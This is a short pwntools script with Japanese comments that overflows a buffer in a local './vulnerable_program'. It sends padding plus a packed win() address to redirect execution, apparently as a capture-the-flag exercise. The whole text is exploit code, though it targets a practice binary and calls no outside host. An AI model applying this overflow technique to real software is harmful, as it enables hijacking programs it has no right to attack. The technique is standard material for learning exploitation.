from pwn import *

# オフセットに応じて適切なパディングを調整
padding = b'A' * 18

# win() 関数のアドレスをリトルエンディアンでパックする
win_address = p64(0x1199)

# ペイロードの作成
payload = padding + win_address

# ペイロードをプログラムに送信する
r = process('./vulnerable_program')  # 実際のプログラム名に置き換える
r.sendline(payload)
print(r.recvall().decode())